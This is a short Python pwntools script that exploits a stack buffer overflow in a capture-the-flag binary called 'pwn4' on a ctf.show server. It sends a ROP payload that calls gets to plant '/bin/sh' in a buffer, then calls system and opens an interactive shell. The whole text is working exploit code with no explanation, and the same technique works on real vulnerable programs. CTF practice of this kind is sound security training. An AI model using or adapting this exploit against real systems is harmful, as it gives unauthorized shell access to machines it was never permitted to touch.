from pwn import *
context.log_level = 'debug'
io =remote('pwn.challenge.ctf.show',28141)
elf = ELF('pwn4')
gets    = elf.symbols['gets']
system  = elf.symbols['system']
buf2 = 0x0804B060
pop_ebx = 0x08048409
payload = cyclic(0x6C+4)+p32(gets)+p32(pop_ebx)+p32(buf2)+p32(system)+p32(0)+p32(buf2)
io.sendline(payload)
io.sendline('/bin/sh')
io.recv()
io.interactive()